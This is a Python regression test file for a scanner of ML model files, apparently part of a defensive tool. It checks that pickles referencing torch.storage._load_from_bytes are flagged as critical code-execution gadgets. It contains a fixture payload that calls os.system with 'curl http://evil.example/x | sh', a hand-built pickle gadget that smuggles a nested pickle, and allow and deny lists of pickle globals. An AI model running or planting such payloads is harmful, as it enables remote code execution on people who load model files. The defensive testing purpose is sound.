"""Regression tests for the MFV pickle global allow/deny classification.

`torch.storage._load_from_bytes` used to sit in ``PICKLE_ALLOWED_GLOBALS``,
filed alongside the genuinely benign tensor-rebuild helpers. Its entire body
is a nested *unrestricted* load:

    def _load_from_bytes(b):
        return torch.load(io.BytesIO(b), weights_only=False)

so a pickle whose GLOBAL references it is a self-contained code-execution
gadget: the real payload is a second pickle carried inline as the literal
bytes argument, which the opcode walker never descends into. Being on the
allow list meant such a file produced *no* finding at all -- not even the
INFO-tier MFV-PICKLE-004 unknown-globals finding, which is the floor for
anything unrecognized. PyTorch's own ``weights_only`` allowlist deliberately
excludes this callable, so the scanner was more permissive than the loader it
models.

The fixtures are hand-built protocol-4 streams (same approach as
test_mfv_pickle_reduce.py) so the suite stays independent of whether torch
is installed in the test environment.
"""

from __future__ import annotations

import pickle
import pickletools

from hayward.findings import Severity
from hayward.scanner import (
    PICKLE_ALLOWED_GLOBALS,
    PICKLE_DENIED_GLOBALS,
    ModelFileScanner,
    _classify_pickle_global,
    _resolve_pickle_globals,
)


class _InnerPayload:
    """The nested pickle smuggled inside the bytes argument. Never reached by
    the outer walk -- it exists to show what `_load_from_bytes` would hand to
    an unrestricted `torch.load`."""

    def __reduce__(self):
        import os
        return (os.system, ("curl http://evil.example/x | sh",))


def _load_from_bytes_pickle_bytes(inner: bytes) -> bytes:
    """Hand-built protocol-4 stream: resolve `torch.storage._load_from_bytes`
    via STACK_GLOBAL and REDUCE it with `inner` as a literal bytes argument.

    This is byte-for-byte the shape a plain `pickle.dumps(some_tensor)`
    produces -- torch's `UntypedStorage.__reduce__` returns
    `(_load_from_bytes, (buf.getvalue(),))` -- except that here the blob is
    an attacker's pickle rather than serialized tensor data. Nothing in the
    outer stream distinguishes the two."""
    assert len(inner) < 256, "fixture relies on SHORT_BINBYTES"
    return (
        b"\x80\x04"
        + b"\x8c\x0dtorch.storage\x94"     # SHORT_BINUNICODE 'torch.storage' + MEMOIZE
        + b"\x8c\x10_load_from_bytes\x94"  # SHORT_BINUNICODE '_load_from_bytes' + MEMOIZE
        + b"\x93\x94"                       # STACK_GLOBAL + MEMOIZE -> the ref
        + b"C" + bytes([len(inner)]) + inner + b"\x94"  # SHORT_BINBYTES + MEMOIZE
        + b"\x85\x94"                       # TUPLE1 + MEMOIZE -> (inner,)
        + b"R\x94"                          # REDUCE + MEMOIZE -> the nested load
        + b"."                              # STOP
    )


class TestLoadFromBytesIsDenied:
    def test_classified_denied_not_allowed(self):
        ref = "torch.storage._load_from_bytes"
        assert ref in PICKLE_DENIED_GLOBALS
        assert ref not in PICKLE_ALLOWED_GLOBALS
        assert _classify_pickle_global(ref) == "denied"

    def test_not_rescued_by_the_torch_suffix_wildcard(self):
        """`_PICKLE_ALLOWED_SUFFIX_RULES` wildcard-allows any `torch.*` name
        ending in Storage/Tensor. `_load_from_bytes` doesn't match either
        suffix, but pin the ordering anyway: deny is checked before both the
        exact allow list and the suffix rules, so a future suffix rule can't
        silently re-allow a denied callable."""
        assert _classify_pickle_global("torch.storage._load_from_bytes") == "denied"
        # A real dtype storage class still classifies allowed via the wildcard.
        assert _classify_pickle_global("torch.FloatStorage") == "allowed"

    def test_pickle_referencing_load_from_bytes_is_critical(self, tmp_path):
        """The end-to-end case from the writeup: a .pkl whose only global is
        `_load_from_bytes` must produce MFV-PICKLE-001 at CRITICAL. Before the
        fix this file scanned completely clean."""
        inner = pickle.dumps(_InnerPayload(), protocol=4)
        data = _load_from_bytes_pickle_bytes(inner)

        globals_found, resolved_calls, _memo = _resolve_pickle_globals(data)
        assert "torch.storage._load_from_bytes" in globals_found
        # The nested pickle is opaque to the walker -- the outer stream sees a
        # bytes literal, so the inner os.system never shows up as a global.
        # This is exactly why the reference itself has to be the signal.
        assert "os.system" not in globals_found
        assert [c.ref for c in resolved_calls] == ["torch.storage._load_from_bytes"]

        p = tmp_path / "storage_gadget.pkl"
        p.write_bytes(data)
        findings = ModelFileScanner().scan_file(p)

        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, f"expected MFV-PICKLE-001, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert critical[0].severity == Severity.CRITICAL
        assert "torch.storage._load_from_bytes" in critical[0].message
        assert "torch.storage._load_from_bytes" in critical[0].metadata["denied_globals"]

    def test_referenced_without_being_called_still_critical(self, tmp_path):
        """Same rule as every other denied global: the bare reference is
        enough, no REDUCE required."""
        data = (
            b"\x80\x04"
            + b"\x8c\x0dtorch.storage\x94"
            + b"\x8c\x10_load_from_bytes\x94"
            + b"\x93\x94"   # STACK_GLOBAL -> ref
            + b"0"          # POP -- never reduced
            + b"N"          # NONE -- benign top-level value
            + b"."
        )
        opnames = [op.name for op, _arg, _pos in pickletools.genops(data)]
        assert "REDUCE" not in opnames

        p = tmp_path / "storage_ref_only.pkl"
        p.write_bytes(data)
        findings = ModelFileScanner().scan_file(p)

        critical = [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
        assert critical, f"expected MFV-PICKLE-001, got: {[(f.rule_id, f.severity) for f in findings]}"
        assert critical[0].severity == Severity.CRITICAL


class TestBenignTorchGlobalsStillAllowed:
    """Guard against over-correcting: the tensor-rebuild helpers that a real
    `torch.save` checkpoint emits must stay allowed. Every one of these is
    also on PyTorch's own `weights_only` allowlist."""

    def test_real_state_dict_globals_are_allowed(self):
        # The exact global set emitted by torch.save() of a simple state_dict.
        for ref in (
            "collections.OrderedDict",
            "torch.FloatStorage",
            "torch._utils._rebuild_tensor_v2",
        ):
            assert _classify_pickle_global(ref) == "allowed", ref

    def test_torch_save_shaped_pickle_produces_no_critical(self, tmp_path):
        """A stream referencing only rebuild helpers must not trip
        MFV-PICKLE-001."""
        data = (
            b"\x80\x04"
            + b"\x8c\x0ctorch._utils\x94"
            + b"\x8c\x14_rebuild_tensor_v2\x94"
            + b"\x93\x94"
            + b"0"
            + b"N"
            + b"."
        )
        p = tmp_path / "benign_rebuild.pkl"
        p.write_bytes(data)
        findings = ModelFileScanner().scan_file(p)

        assert not [f for f in findings if f.rule_id == "MFV-PICKLE-001"]
